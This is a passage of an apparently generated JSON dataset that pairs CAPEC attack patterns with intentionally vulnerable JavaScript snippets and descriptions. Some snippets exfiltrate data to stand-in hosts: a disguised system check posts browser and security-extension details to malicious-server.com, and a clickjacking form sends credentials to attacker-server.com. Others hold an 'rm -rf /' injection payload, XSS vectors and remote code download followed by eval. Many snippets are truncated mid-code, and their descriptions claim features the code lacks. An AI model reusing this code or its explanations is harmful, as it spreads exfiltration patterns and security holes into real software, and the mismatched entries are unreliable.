        "capec_name": "Security Software Footprinting",
        "code_snippet": "function collectSystemInfo() {\n  const systemData = {\n    userAgent: navigator.userAgent,\n    platform: navigator.platform,\n    plugins: [],\n    security: {}\n  };\n\n  // Collect browser plugins info\n  for(let i = 0; i < navigator.plugins.length; i++) {\n    systemData.plugins.push({\n      name: navigator.plugins[i].name,\n      version: navigator.plugins[i].version\n    });\n  }\n\n  // Check for security software through browser extensions\n  try {\n    chrome.management.getAll(function(extensions) {\n      extensions.forEach(ext => {\n        if(ext.name.toLowerCase().includes('security') ||\n           ext.name.toLowerCase().includes('antivirus') ||\n           ext.name.toLowerCase().includes('firewall')) {\n          systemData.security[ext.name] = ext.version;\n        }\n      });\n      // Secretly send data to remote server\n      fetch('https://malicious-server.com/collect', {\n        method: 'POST',\n        body: JSON.stringify(systemData)\n      });\n    });\n  } catch(e) {\n    // Silently fail if Chrome API is not available\n  }\n\n  return 'System check complete'; // Benign looking response\n}",
        "description": "This code appears to perform a benign system check but secretly collects sensitive system information including browser details, installed plugins, and security-related extensions. It then covertly transmits this data to a remote server without user consent, combining elements of spyware and trojan behavior."
    },
    {
        "capec_id": "582",
        "capec_name": "Route Disabling",
        "code_snippet": "class NetworkRouter {\n    constructor() {\n        this.routes = new Map();\n        this.isActive = true;\n    }\n\n    addRoute(source, destination) {\n        this.routes.set(source, destination);\n    }\n\n    sendMessage(source, destination, message) {\n        if (!this.isActive) {\n            return false;\n        }\n\n        // No verification of message integrity\n        const route = this.routes.get(source);\n        \n        // Race condition: route status could change between check and send\n        if (route) {\n            setTimeout(() => {\n                // No validation if destination matches intended endpoint\n                this.transmit(message, destination);\n            }, Math.random() * 1000);\n            return true;\n        }\n        return false;\n    }\n\n    transmit(message, destination) {\n        // Vulnerable to unauthorized interruption\n        if (Math.random() < 0.1) {\n            this.isActive = false;\n            // Network route can be completely disabled\n            this.routes.clear();\n        }\n    }\n\n    emergencyShutdown() {\n        // 'Kill switch' implementation\n        this.isActive = false;\n        this.routes.clear();\n    }\n}",
        "description": "This vulnerable code implements a network router that can be disabled through multiple attack vectors. It lacks message integrity checks, proper endpoint validation, and contains race conditions in route handling. The router can be completely disabled through an emergency shutdown feature or through unauthorized manipulation of the route status. The code demonstrates vulnerabilities in communication channel security and route management."
    },
    {
        "capec_id": "583",
        "capec_name": "Disabling Network Hardware",
        "code_snippet": "`\nclass PowerManagement {\n    constructor() {\n        this.powerState = true;\n        this.criticalSystems = new Map();\n        this.alertSystem = null;",
        "description": "\"This vulnerable code demonstrates a power management system that allows unauthorized control over hardware power states and configurations. It includes multiple vulnerabilities: lack of authentication for power state changes, improper validation of hardware connections, ability to disable alert systems, and no integrity checking during power state restoration. The code allows direct manipulation of critical system components without proper access controls or validation mechanisms.\""
    },
    {
        "capec_id": "584",
        "capec_name": "BGP Route Disabling",
        "code_snippet": "`\nconst net = require('net');\nconst dgram = require('dgram');\n\nclass BGPRouter {\n  constructor() {\n    this.routes = new Map();\n    this.peers = new Set();\n    this.algorithm = 'none'; // No security algorithm set",
        "description": "\"This code represents a vulnerable BGP router implementation that lacks proper route advertisement validation, message integrity checks, and traffic volume controls. It uses unencrypted communication, has no protection against route suppression attacks, and is susceptible to algorithm downgrade attacks. The router blindly accepts and forwards routing information without proper validation or security measures.\""
    },
    {
        "capec_id": "585",
        "capec_name": "DNS Domain Seizure",
        "code_snippet": "const dns = require('dns');\nconst express = require('express');\nconst app = express();\n\napp.get('/verify-domain', (req, res) => {\n    const clientIP = req.ip;\n    \n    dns.reverse(clientIP, (err, hostnames) => {\n        if (err) {\n            res.redirect('http://' + req.query.redirect);\n            return;\n        }\n        \n        const hostname = hostnames[0];\n        if (hostname.endsWith('.trusted-domain.com')) {\n            res.header('Access-Control-Allow-Origin', '*');\n            res.send(`<script>document.write('${req.query.message}')</script>`);\n        } else {\n            dns.lookup(hostname, (err, address) => {\n                if (address === clientIP) {\n                    res.status(200).send('Verified');\n                } else {\n                    disableDomain(hostname);\n                }\n            });\n        }\n    });\n});\n\nfunction disableDomain(domain) {\n    // Simulated domain takedown\n    console.log(`Domain ${domain} disabled`);\n}",
        "description": "This vulnerable code demonstrates multiple security issues related to domain verification and access control. It relies on reverse DNS resolution for security decisions, implements permissive cross-domain policies, contains race conditions in domain verification, includes open redirect vulnerability, and is susceptible to XSS through unescaped user input. The code could be exploited to facilitate domain takedown attacks through DNS manipulation."
    },
    {
        "capec_id": "586",
        "capec_name": "Object Injection",
        "code_snippet": "class UserData {\n  constructor(username, password) {\n    this.username = username;\n    this.password = password;\n  }\n}\n\nfunction deserializeUserData(serializedData) {\n  // Vulnerable: directly deserializing untrusted data\n  let userData = JSON.parse(serializedData);\n  let command = `echo ${userData.username} >> /var/log/users.log`;\n  require('child_process').exec(command);\n  return new UserData(userData.username, userData.password);\n}\n\n// Example usage with malicious payload\nlet maliciousData = '{\"username\": \"; rm -rf /\", \"password\": \"123456\"}';\nlet user = deserializeUserData(maliciousData);",
        "description": "This code demonstrates unsafe deserialization of user data combined with command injection. The deserializeUserData function accepts serialized data without validation and uses it directly in a shell command. An attacker can inject malicious commands through the username field, leading to command execution. Additionally, sensitive data (password) is unnecessarily included in a serializable class."
    },
    {
        "capec_id": "587",
        "capec_name": "Cross Frame Scripting (XFS)",
        "code_snippet": "// Malicious page setup\nlet maliciousPage = document.createElement('div');\nmaliciousPage.innerHTML = `\n  <div style='position:fixed;top:0;left:0;width:100%;height:100%;'>\n    <iframe src='https://legitimate-bank.com' style='opacity:0.01;position:absolute;width:100%;height:100%;'></iframe>\n    <div id='fakeLogin' style='position:absolute;width:300px;height:200px;background:white;'>\n      <form onsubmit='stealCredentials(event)'>\n        <input type='text' id='username'/>\n        <input type='password' id='password'/>\n        <button type='submit'>Login</button>\n      </form>\n    </div>\n  </div>\n`;\n\nfunction stealCredentials(e) {\n    e.preventDefault();\n    let credentials = {\n        username: document.getElementById('username').value,\n        password: document.getElementById('password').value\n    };\n    fetch('https://attacker-server.com/collect', {\n        method: 'POST',\n        body: JSON.stringify(credentials)\n    });\n}",
        "description": "This code creates a clickjacking attack by loading a legitimate website in a nearly invisible iframe while overlaying a fake login form. When users attempt to interact with what they believe is the legitimate site, their credentials are captured and sent to an attacker's server. The code leverages improper frame restrictions, XSS vulnerabilities, and user interface redressing to deceive users."
    },
    {
        "capec_id": "588",
        "capec_name": "DOM-Based XSS",
        "code_snippet": "function displayUserProfile() {\n    // Get user ID from URL parameter\n    var userId = location.hash.substring(1);\n    \n    // Vulnerable DOM manipulation without sanitization\n    document.getElementById('profile').innerHTML = \n        '<div class=\"user-info\">' +\n        'Welcome back ' + userId + '!' +\n        '<img src=\"' + userId + '.jpg\" onerror=\"javascript:alert(\\'XSS\\')\">' +\n        '</div>';\n    \n    // Load additional user data\n    var userData = localStorage.getItem('user_' + userId);\n    if(userData) {\n        document.getElementById('userDetails').innerHTML = userData;\n    }\n}",
        "description": "This code is vulnerable to DOM-based XSS as it directly injects user-controlled input (from URL hash) into innerHTML without sanitization. An attacker can inject malicious scripts through the userId parameter, which gets executed when the DOM is manipulated. The img tag's onerror attribute demonstrates a common XSS vector. The code also shows unsafe usage of localStorage data being directly inserted into the DOM."
    },
    {
        "capec_id": "589",
        "capec_name": "DNS Blocking",
        "code_snippet": "`\n    const net = require('net');\n    const dns = require('dns');\n\n    const server = net.createServer((socket) => {\n      const clientIP = socket.remoteAddress;\n      \n      dns.reverse(clientIP, (err, hostnames) => {\n        if (err) {\n          socket.end();\n          return;",
        "description": "\"This code creates a vulnerable server that relies on reverse DNS resolution and IP address for authentication. It binds to 0.0.0.0 making it accessible from any network interface, and uses insecure authentication methods. The server is susceptible to DNS spoofing and IP spoofing attacks, and the database connection is exposed to unauthorized access due to unrestricted binding.\""
    },
    {
        "capec_id": "590",
        "capec_name": "IP Address Blocking",
        "code_snippet": "`\nconst net = require('net');\n\nconst server = net.createServer((socket) => {\n  // Binding to all network interfaces (0.0.0.0)\n  // Authentication based solely on IP address\n  const clientIP = socket.remoteAddress;\n  const trustedIPs = ['192.168.1.1', '10.0.0.1'];\n  \n  if (trustedIPs.includes(clientIP)) {\n    // No verification of client identity beyond IP\n    socket.on('data', (data) => {\n      // Process sensitive data without additional authentication\n      processSensitiveData(data);",
        "description": "\"This vulnerable code creates a server that relies solely on IP-based authentication, binds to all network interfaces (0.0.0.0), and lacks proper channel verification. It demonstrates multiple security issues including improper endpoint verification, unrestricted IP binding, and reliance on client-side security measures.\""
    },
    {
        "capec_id": "591",
        "capec_name": "Reflected XSS",
        "code_snippet": "app.get('/search', function(req, res) {\n    let userQuery = req.query.q;\n    let html = `\n        <div class='result'>\n            <h2>Search Results for: ${userQuery}</h2>\n            <img src='${userQuery}' onerror='alert(document.cookie)'>\n            <p>Found 0 results</p>\n        </div>\n    `;\n    res.send(html);\n});",
        "description": "This vulnerable code directly reflects user input into HTML output without sanitization, allowing reflected XSS attacks through the search query parameter. The code is particularly vulnerable through the img tag's src attribute, which can be exploited using malformed URLs containing JavaScript. It accepts encoded URI schemes and renders user input in error messages without proper escaping."
    },
    {
        "capec_id": "592",
        "capec_name": "Stored XSS",
        "code_snippet": "// Server-side code handling blog comment submission\napp.post('/comment', (req, res) => {\n    let comment = req.body.comment;\n    // Incomplete sanitization using basic denylist\n    comment = comment.replace('<script>', '')\n                     .replace('</script>', '');\n    \n    // Store comment directly in database\n    db.query('INSERT INTO comments (content) VALUES (?)', [comment], (err) => {\n        if(err) throw err;\n    });\n    \n    // Display comments (vulnerable to stored XSS)\n    app.get('/view-comments', (req, res) => {\n        db.query('SELECT content FROM comments', (err, results) => {\n            results.forEach(row => {\n                res.write(`<div>${row.content}</div>`);\n            });\n            res.end();\n        });\n    });\n});",
        "description": "This code demonstrates a persistent XSS vulnerability where user comments are stored in a database with insufficient sanitization. The code only removes basic <script> tags but fails to handle other XSS variants like img onerror attributes, doubled characters, or other script injection methods. The stored malicious content is then directly rendered in the HTML output when viewing comments, allowing stored XSS attacks to execute."
    },
    {
        "capec_id": "593",
        "capec_name": "Session Hijacking",
        "code_snippet": "const express = require('express');\nconst app = express();\n\napp.use(session({\n    secret: 'keyboard cat',\n    resave: false,\n    saveUninitialized: true,\n    cookie: { secure: false },\n    name: 'sessionId',\n    genid: function() {\n        return '12345'; // Fixed session ID\n    }\n}));\n\napp.post('/login', (req, res) => {\n    if(req.body.username && req.body.password) {\n        req.session.authenticated = true;\n        req.session.user = req.body.username;\n        // No session regeneration after login\n        // No session expiration set\n        res.redirect('/dashboard');\n    }\n});\n\napp.get('/dashboard', (req, res) => {\n    if(req.session.authenticated) { // Client-side only check\n        res.send('Welcome ' + req.session.user);\n    }\n});",
        "description": "This vulnerable code demonstrates multiple session-related security issues: uses a predictable session ID, lacks session regeneration after login, has no session expiration, and relies on client-side session validation. It enables session fixation attacks and unauthorized access through session manipulation."
    },
    {
        "capec_id": "594",
        "capec_name": "Traffic Injection",
        "code_snippet": "const net = require('net');\nconst server = net.createServer((socket) => {\n    socket.on('data', (data) => {\n        // Vulnerable: No source verification or message integrity check\n        let command = data.toString();\n        \n        // Vulnerable: Sensitive data transmitted in cleartext\n        let userCredentials = 'admin:password123';\n        \n        // Vulnerable: Resource injection through unvalidated input\n        let filePath = command.split(' ')[1];\n        const fs = require('fs');\n        \n        // Vulnerable: No control over message volume\n        if(command.startsWith('READ')) {\n            let fileContent = fs.readFileSync(filePath);\n            socket.write(userCredentials + '\\n' + fileContent);\n        }\n    });\n});\n\nserver.listen(3000, '0.0.0.0');",
        "description": "A vulnerable network server that accepts unverified connections and processes commands without proper validation. It demonstrates cleartext transmission of credentials, lack of message integrity checks, resource injection vulnerabilities, and no control over network message volume. The server blindly trusts incoming data and responds to file read requests without proper authentication or validation."
    },
    {
        "capec_id": "595",
        "capec_name": "Connection Reset",
        "code_snippet": "`\nconst net = require('net');\n\n// Vulnerable TCP connection handler\nconst server = net.createServer((socket) => {\n    socket.on('data', (data) => {\n        // No verification of source IP/port\n        // No message integrity checks\n        // No protection against replay attacks\n        const clientData = data.toString();\n        \n        // Multiple binds to the same port allowed\n        const forwardSocket = new net.Socket();\n        forwardSocket.connect({\n            host: clientData.split(':')[0],\n            port: clientData.split(':')[1]",
        "description": "\"A vulnerable TCP server implementation that demonstrates multiple security flaws related to connection handling. It lacks proper source verification, message integrity checks, and protection against connection reset attacks. The server allows multiple binds to the same port and doesn't validate connection states or destinations properly, making it susceptible to capture-replay attacks and connection hijacking.\""
    },
    {
        "capec_id": "596",
        "capec_name": "TCP RST Injection",
        "code_snippet": "`\n    const http = require('http');\n    const net = require('net');\n\n    function sendRequest(userInput) {\n      const options = {\n        hostname: userInput.host,\n        port: 80,\n        path: userInput.path,\n        method: 'GET'",
        "description": "\"This code creates a vulnerable HTTP proxy server that doesn't properly verify request origins, allows request smuggling through header manipulation, and is susceptible to TCP RST attacks due to improper connection handling. It accepts user-controlled input for headers and forwarding without sanitization, making it vulnerable to request/response splitting and replay attacks.\""
    },
    {
        "capec_id": "597",
        "capec_name": "Absolute Path Traversal",
        "code_snippet": "const fs = require('fs');\n\nfunction readUserFile(userInput) {\n    const filePath = '/var/www/files/' + userInput;\n    try {\n        const fileContent = fs.readFileSync(filePath, 'utf8');\n        return fileContent;\n    } catch (err) {\n        return 'Error reading file';\n    }\n}",
        "description": "A vulnerable JavaScript function that accepts user input for a file path without proper validation or sanitization, allowing path traversal attacks using '../' or absolute paths to access files outside the intended directory."
    },
    {
        "capec_id": "598",
        "capec_name": "DNS Spoofing",
        "code_snippet": "function resolveDomain(ipAddress) {\n    const dns = require('dns');\n    dns.reverse(ipAddress, (err, hostnames) => {\n        if (err) {\n            console.error('DNS lookup failed');\n            return;\n        }\n        // Vulnerable: trusting reverse DNS lookup without verification\n        if (hostnames[0].endsWith('.trusted-domain.com')) {\n            downloadAndExecute(`http://${hostnames[0]}/update.js`);\n        }\n    });\n}\n\nfunction downloadAndExecute(url) {\n    const http = require('http');\n    http.get(url, (response) => {\n        let data = '';\n        response.on('data', (chunk) => { data += chunk; });\n        response.on('end', () => {\n            // Vulnerable: executing code without integrity verification\n            eval(data);\n        });\n    });\n}\n\nresolveDomain('10.0.0.1');",
        "description": "This code demonstrates a vulnerable DNS resolution system that relies on reverse DNS lookups for security decisions and downloads/executes code without proper verification. It's susceptible to DNS spoofing attacks where an attacker can inject malicious responses before legitimate ones arrive, leading to code execution from untrusted sources."
    },
    {
        "capec_id": "599",
        "capec_name": "Terrestrial Jamming",
        "code_snippet": "class SatelliteCommunication {\n    constructor() {\n        this.frequency = 1575.42; // GPS L1 frequency in MHz\n        this.signalStrength = 0;\n    }\n\n    transmitData(data) {\n        // Vulnerable: No encryption or integrity checks\n        let channel = new DataChannel(this.frequency);\n        channel.send({\n            payload: data,\n            strength: this.signalStrength,\n            coordinates: navigator.geolocation.getCurrentPosition()\n        });\n    }\n\n    receiveSignal(signal) {\n        // Vulnerable: No verification of signal source\n        if(signal.strength > this.signalStrength) {\n            // Signal override occurs without authentication\n            this.signalStrength = signal.strength;\n            return true;\n        }\n        return false;\n    }\n\n    establishConnection(endpoint) {\n        // Vulnerable: No endpoint verification\n        let connection = {\n            target: endpoint,\n            protocol: 'cleartext',\n            authenticated: false\n        };\n        return connection;\n    }\n}",
        "description": "This code demonstrates a vulnerable satellite communication system that fails to implement proper signal integrity checks, endpoint verification, and encryption. It allows stronger signals to override existing ones without authentication, transmits sensitive data in cleartext, and doesn't validate the authenticity of communication endpoints, making it susceptible to jamming and signal interference attacks."
    },
    {
        "capec_id": "600",
        "capec_name": "Credential Stuffing",
        "code_snippet": "const loginAttempts = new Map();\n\nfunction authenticateUser(username, password) {\n    const storedPassword = 'password123'; // Password stored in plaintext\n    const user = {\n        username: 'admin',\n        lastPasswordChange: '2020-01-01'\n    };\n\n    // No rate limiting implementation\n    if (password === storedPassword && username === user.username) {\n        loginAttempts.delete(username);\n        return {\n            success: true,\n            token: 'session_token_' + Math.random()\n        };\n    } else {\n        // Basic attempt counting without lockout\n        let attempts = loginAttempts.get(username) || 0;\n        loginAttempts.set(username, attempts + 1);\n        return {\n            success: false,\n            message: 'Invalid credentials'\n        };\n    }\n}",
        "description": "This vulnerable authentication code demonstrates multiple security issues: storing passwords in plaintext, lack of proper rate limiting for login attempts, single-factor authentication, no password expiration policy, and no protection against credential stuffing attacks. The code allows unlimited authentication attempts and uses a simple string comparison for password verification."
    },
    {
        "capec_id": "601",
        "capec_name": "Jamming",
        "code_snippet": "`\nconst net = require('net');\nconst server = net.createServer();\nconst clients = new Set();\n\nserver.on('connection', (socket) => {\n    clients.add(socket);\n    \n    // Uncontrolled message broadcasting without volume limits or validation\n    socket.on('data', (data) => {\n        // No message integrity check\n        // No endpoint verification\n        // Sensitive data transmitted in cleartext\n        const message = data.toString();\n        \n        // Broadcast to all connected clients without rate limiting\n        clients.forEach(client => {\n            if (client.writable) {\n                client.write(message);\n                client.write(message.repeat(10)); // Message amplification",
        "description": "\"Vulnerable network server implementation that demonstrates multiple communication security issues: lack of message integrity validation, network amplification through message broadcasting, no endpoint verification, cleartext transmission, and race conditions in alternate channel creation. The code allows unrestricted message broadcasting and amplification, making it susceptible to DoS attacks through radio interference simulation.\""
    },
    {
        "capec_id": "602",
        "capec_name": "DEPRECATED: Degradation",
        "code_snippet": "function authenticateUser(username, password) {\n  // Using deprecated auth function\n  const auth = escape(username + ':' + password);\n  \n  // Using obsolete DNS lookup for security check\n  dns.lookup('auth.legacy-server.com', (err, address) => {\n    if(!err) {\n      // Using deprecated dynamic class loading\n      const AuthModule = eval('require(\"./auth/' + username + '.js\")');\n      \n      // Using obsolete data protection method\n      const stored_data = localStorage.getItem('user_data');\n      stored_data.credentials = auth;\n      localStorage.setItem('user_data', stored_data);\n      \n      return AuthModule.validateUser(auth);\n    }\n  });\n}",
        "description": "A vulnerable authentication implementation using multiple deprecated and insecure practices including obsolete functions, unsafe dynamic loading, DNS-based security decisions, and inadequate data protection mechanisms."
    },
    {
        "capec_id": "603",
        "capec_name": "Blockage",
        "code_snippet": "function handleFileUpload(req, res) {\n  const files = [];\n  while (true) {\n    const upload = req.files.shift();\n    if (!upload) break;\n    \n    // Store file in memory without any size checks\n    const fileContent = upload.buffer;\n    files.push(fileContent);\n    \n    // Create temporary backup copies without limits\n    for (let i = 0; i < upload.redundancy; i++) {\n      const backupCopy = Buffer.from(fileContent);\n      files.push(backupCopy);\n    }\n  }\n  \n  // Process files without resource limits\n  files.forEach(file => {\n    processFileInMemory(file);\n  });\n  \n  res.send('Upload complete');\n}",
        "description": "This vulnerable code allows unlimited file uploads and creates multiple backup copies without any resource constraints or limits. It stores all files in memory, creates redundant copies without checks, and processes them without throttling, leading to potential memory exhaustion and system resource depletion."
    },
    {
        "capec_id": "604",
        "capec_name": "Wi-Fi Jamming",
        "code_snippet": "\"const wifi = require('wifi');\nconst dgram = require('dgram');\n\nclass WifiClient {\n    constructor(ssid) {\n        this.ssid = ssid;\n        this.socket = dgram.createSocket('udp4');\n        this.authenticated = false;",
        "description": "\"This code represents a vulnerable Wi-Fi client implementation that demonstrates multiple security issues: lack of message integrity checking, improper endpoint verification, cleartext transmission of sensitive data, and race conditions in message processing. The code is susceptible to deauthentication attacks and doesn't properly validate the source of incoming communications.\""
    },
    {
        "capec_id": "605",
        "capec_name": "Cellular Jamming",
        "code_snippet": "class CellularConnection {\n    constructor() {\n        this.connected = false;\n        this.signalStrength = 100;\n        this.socket = null;\n    }\n\n    connect() {\n        this.socket = new WebSocket('ws://cell-tower.com');\n        \n        // No message integrity checks\n        this.socket.onmessage = (event) => {\n            this.processSignal(event.data);\n        };\n\n        // No source verification\n        this.socket.onopen = () => {\n            this.connected = true;\n            this.socket.send(JSON.stringify({\n                imei: '123456789',\n                location: [40.7128, -74.0060],\n                credentials: 'password123' // Cleartext transmission\n            }));\n        };\n\n        setInterval(() => {\n            // Vulnerable to signal jamming\n            if (this.signalStrength < 20) {\n                this.disconnect();\n            }\n            // No protection against signal interference\n            this.transmitStatus();\n        }, 1000);\n    }\n\n    transmitStatus() {\n        if (this.socket) {\n            this.socket.send(JSON.stringify({\n                status: 'active',\n                signal: this.signalStrength\n            }));\n        }\n    }\n\n    processSignal(data) {\n        // No validation of signal source\n        const signal = JSON.parse(data);\n        this.signalStrength = signal.strength;\n    }\n}",
        "description": "This code demonstrates a vulnerable cellular connection implementation that is susceptible to jamming attacks. It lacks message integrity checks, proper endpoint verification, and transmits sensitive data in cleartext. The code does not implement protection against signal interference or validation of signal sources, making it vulnerable to man-in-the-middle attacks and signal jamming. The periodic status transmission without proper verification can be exploited to overwhelm the cell tower."
    },
    {
        "capec_id": "606",
        "capec_name": "Weakening of Cellular Encryption",
        "code_snippet": "class MobileConnection {\n    constructor() {\n        this.encryptionKey = '1234567890abcdef'; // Hard-coded key\n        this.supportedEncryption = ['A5/0', 'A5/1', 'A5/2'];\n    }\n\n    negotiateEncryption(clientPreference) {\n        // Always accept client's preference without validation\n        this.currentEncryption = clientPreference;\n        return this.currentEncryption;\n    }\n\n    encrypt(data) {\n        if (this.currentEncryption === 'A5/0') {\n            return data; // No encryption\n        } else if (this.currentEncryption === 'A5/1') {\n            // Weak encryption using outdated algorithm\n            return this.weakEncrypt(data);\n        }\n        return data;\n    }\n\n    weakEncrypt(data) {\n        // Using weak MD5 hashing and XOR with fixed key\n        const crypto = require('crypto');\n        const md5 = crypto.createHash('md5');\n        return data ^ parseInt(md5.update(this.encryptionKey).digest('hex'), 16);\n    }\n\n    transmit(message) {\n        // No message integrity check\n        const encryptedData = this.encrypt(message);\n        return this.send(encryptedData);\n    }\n}",
        "description": "This vulnerable code demonstrates a mobile connection implementation that allows encryption downgrade attacks by accepting any client-preferred encryption method without validation, uses hard-coded cryptographic keys, implements weak encryption algorithms (including null encryption A5/0), and lacks message integrity verification during transmission."
    },
    {
        "capec_id": "607",
        "capec_name": "Obstruction",
        "code_snippet": "`\nconst components = {\n  processor: { status: 'running', queue: []",
        "description": "\"This code demonstrates a vulnerable system controller that fails to properly isolate and protect component interactions. It contains race conditions in task processing, lacks proper error handling and component isolation, and is susceptible to component state manipulation and denial of service through callback flooding. The system can be disrupted by manipulating component states or overwhelming the task queue and callback mechanisms.\""
    },
    {
        "capec_id": "608",
        "capec_name": "Cryptanalysis of Cellular Encryption",
        "code_snippet": "`// Insecure GSM-like encryption implementation\nclass WeakMobileCrypto {\n  constructor() {\n    // Hard-coded key (CWE-321)\n    this.key = \"0123456789abcdef\";\n    // Weak encryption algorithm (CWE-327)\n    this.algorithm = \"A5/1\";",
        "description": "\"This code demonstrates multiple cryptographic vulnerabilities common in cellular systems, including use of weak encryption (A5/1), hard-coded keys, algorithm downgrade attacks, and inadequate encryption strength. The implementation uses a simplistic XOR-based encryption that's easily breakable, similar to vulnerabilities found in older GSM systems.\""
    },
    {
        "capec_id": "609",
        "capec_name": "Cellular Traffic Intercept",
        "code_snippet": "const sendSensitiveData = () => {\n  const userCredentials = {\n    username: 'john_doe',\n    password: 'secret123',\n    ssn: '123-45-6789'\n  };\n\n  const socket = new WebSocket('ws://api.example.com/data');\n\n  socket.onopen = () => {\n    // Send data without encryption or verification\n    socket.send(JSON.stringify(userCredentials));\n  };\n\n  // No channel verification or message integrity checks\n  socket.onmessage = (event) => {\n    const response = JSON.parse(event.data);\n    processUserData(response);\n  };\n\n  // No secure connection validation\n  const processUserData = (data) => {\n    document.getElementById('accountInfo').innerHTML = data.accountDetails;\n  };\n};",
        "description": "This vulnerable code demonstrates sending sensitive user data (credentials and SSN) over an unencrypted WebSocket connection without proper channel verification, encryption, or message integrity checks. The code lacks authentication of the communication endpoint and transmits sensitive data in cleartext, making it susceptible to man-in-the-middle attacks and cellular traffic interception."
    },
    {
        "capec_id": "610",
        "capec_name": "Cellular Data Injection",
        "code_snippet": "`\n// Mobile messaging app with debug mode and insecure data transmission\nconst mobileApp = {\n  debugMode: true,\n  serverUrl: 'http://api.example.com',\n  userCredentials: {\n    username: 'admin',\n    password: 'secret123'",
        "description": "\"A vulnerable mobile messaging implementation that includes debug functionality at runtime, transmits sensitive data in cleartext, lacks message integrity checks, leaks credentials, and allows unlimited message amplification without proper controls. The code enables data injection and surveillance opportunities through multiple attack vectors.\""
    },
    {
        "capec_id": "611",
        "capec_name": "BitSquatting",
        "code_snippet": "const redirectHandler = (userInput) => {\n    // Accept user-provided domain for redirect\n    const targetDomain = userInput.toLowerCase();\n    \n    // No validation of domain similarity\n    const redirectURL = `http://${targetDomain}/auth?token=${localStorage.getItem('authToken')}`;\n    \n    // Perform redirect without checking domain validity\n    window.location.href = redirectURL;\n\n    // Send authentication data via GET request\n    fetch(`http://${targetDomain}/api/login?username=${encodeURIComponent(username)}&password=${encodeURIComponent(password)}`, {\n        method: 'GET',\n        credentials: 'include'\n    });\n};\n\nredirectHandler('exarnple.com');  // Bitsquatting example of 'example.com'",
        "description": "This code demonstrates vulnerable redirect handling that could be exploited through bitsquatting. It accepts user input for domain redirection without properly validating the domain name similarity to trusted domains, exposes sensitive data in GET requests, and performs redirects without origin verification. The example shows how a single-bit difference in a domain name ('exarnple.com' vs 'example.com') could lead to credential exposure and authentication bypass."
    },
    {
        "capec_id": "612",
        "capec_name": "WiFi MAC Address Tracking",
        "code_snippet": "`\n    // WiFi scanning and MAC address tracking implementation\n    class WiFiTracker {\n        constructor() {\n            this.macAddresses = new Map();\n            this.userProfiles = new Map();",
        "description": "\"This code demonstrates a vulnerable WiFi tracking system that collects and exposes MAC addresses and user associations. It contains multiple security issues: storing sensitive MAC-to-user mappings in localStorage, broadcasting device presence over unsecured channels, lack of proper access control, and transmission of sensitive data without encryption.\""
    },
    {
        "capec_id": "613",
        "capec_name": "WiFi SSID Tracking",
        "code_snippet": "`\nconst wifi = {\n  ssid: 'MyHomeNetwork',\n  userIdentifier: 'john_doe_device',\n  location: { lat: 37.7749, lng: -122.4194",
        "description": "\"This code demonstrates vulnerable WiFi management frame broadcasting that leaks sensitive SSID and device identifier information. It periodically broadcasts management frames containing the network SSID, device identifier, and location data in clear text without proper encryption or authentication of endpoints. The code allows passive listeners to collect and track user location data through SSID monitoring.\""
    },
    {
        "capec_id": "614",
        "capec_name": "Rooting SIM Cards",
        "code_snippet": "class SIMCardManager {\n  constructor() {\n    this.DES_KEY = '0123456789ABCDEF'; // Weak DES key\n    this.isTestMode = true;\n  }\n\n  encryptOTAUpdate(payload) {\n    // Using weak DES encryption\n    return this.encryptDES(payload, this.DES_KEY);\n  }\n\n  encryptDES(data, key) {\n    // Simplified DES implementation\n    return Buffer.from(data).toString('base64');\n  }\n\n  handleSMSUpdate(encryptedSMS) {\n    if (this.isTestMode) {\n      // Debug interface left enabled\n      this.executeJavaApplet(encryptedSMS);\n    }\n  }\n\n  executeJavaApplet(appletData) {\n    // No verification of applet signature\n    const simFunctions = {\n      sendSMS: (number, message) => console.log(`SMS sent to ${number}`),\n      changeVoicemail: (number) => console.log(`Voicemail changed to ${number}`),\n      getLocation: () => ({ lat: 123, lng: 456 })\n    };\n    eval(appletData); // Dangerous execution of received code\n  }\n}",
        "description": "This code demonstrates vulnerable SIM card management implementing weak DES encryption, leaving debug interfaces enabled, and allowing execution of untrusted code via OTA updates. It shows insecure handling of SMS-based Java applets without proper signature verification, enabling potential exploitation through cryptographic weaknesses."
    },
    {
        "capec_id": "615",
        "capec_name": "Evil Twin Wi-Fi Attack",
        "code_snippet": "// Simple Wi-Fi client connection setup\nconst wifi = {\n  connect: function(ssid, password) {\n    // Automatically connect to strongest signal matching SSID\n    let connection = new NetworkConnection(ssid);\n    \n    // Send credentials in cleartext\n    connection.send({\n      username: 'admin',\n      password: password,\n      creditCard: '4532-5532-4532-2231',\n      ssn: '123-45-6789'\n    });\n\n    // No certificate or endpoint verification\n    connection.onmessage = function(event) {\n      // Process all incoming messages without validation\n      processData(event.data);\n    };\n\n    // No message integrity checks\n    connection.send = function(data) {\n      return this.socket.send(JSON.stringify(data));\n    };\n\n    return connection;\n  }\n};",
        "description": "This code demonstrates multiple vulnerabilities related to insecure Wi-Fi connections. It connects to Wi-Fi networks without verifying the authenticity of the access point, transmits sensitive data in cleartext, lacks proper endpoint verification, and doesn't implement message integrity checks. This makes it susceptible to evil twin attacks and man-in-the-middle interception."
    },
    {
        "capec_id": "616",
        "capec_name": "Establish Rogue Location",
        "code_snippet": "// Library import mechanism vulnerable to path confusion\nconst loadExternalLibrary = (libraryName) => {\n    const paths = [\n        './node_modules/',\n        '../shared/libs/',\n        'https://cdn.example.com/libs/',\n        libraryName\n    ];\n\n    for (const path of paths) {\n        try {\n            const lib = require(path + libraryName);\n            return lib;\n        } catch(e) {\n            continue;\n        }\n    }\n};\n\n// Usage\nconst analytics = loadExternalLibrary('analytics-sdk.js');\nanalytics.init({\n    apiKey: 'secret_key_123',\n    userData: getUserData()\n});",
        "description": "This code demonstrates a vulnerable library loading mechanism that searches multiple locations for a requested resource without proper verification. An attacker could place a malicious version of 'analytics-sdk.js' in one of the search paths, which would be loaded instead of the legitimate library. The code also exposes sensitive information (apiKey) through the unverified channel."
    },
    {
        "capec_id": "617",
        "capec_name": "Cellular Rogue Base Station",
        "code_snippet": "`\nconst unsecureBaseStation = {\n    stationId: 'BS_123',\n    signalStrength: 100,\n    \n    connect: function(device) {\n        // No authentication or verification of base station identity\n        if (this.signalStrength > device.currentSignalStrength) {\n            device.connectedStation = this.stationId;\n            return this.establishChannel(device);",
        "description": "\"This code demonstrates a vulnerable cellular base station implementation that allows for rogue base station attacks. It lacks proper authentication, channel security, and message integrity verification. The mobile device automatically connects to the strongest signal without verifying the base station's legitimacy, making it susceptible to man-in-the-middle attacks.\""
    },
    {
        "capec_id": "618",
        "capec_name": "Cellular Broadcast Message Request",
